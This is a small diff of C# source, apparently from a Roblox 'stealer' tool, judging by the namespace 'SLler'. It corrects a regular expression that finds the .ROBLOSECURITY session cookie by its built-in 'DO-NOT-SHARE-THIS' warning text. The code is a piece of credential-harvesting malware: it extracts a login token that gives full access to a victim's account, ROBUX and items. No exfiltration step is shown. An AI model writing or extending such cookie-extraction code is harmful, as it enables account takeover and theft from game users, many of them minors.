@@ -73,7 +73,7 @@ namespace SLler
 							if (!string.IsNullOrEmpty(value))
 							{
 								var match = Regex.Match(value,
-									@"_\\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-SL-your-ROBUX-and-items\.\\|_[A-Za-z0-9\.\-_=]+");
+									@"_\\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\\|_[A-Za-z0-9\.\-_=]+");
 
 								if (match.Success)
 								{
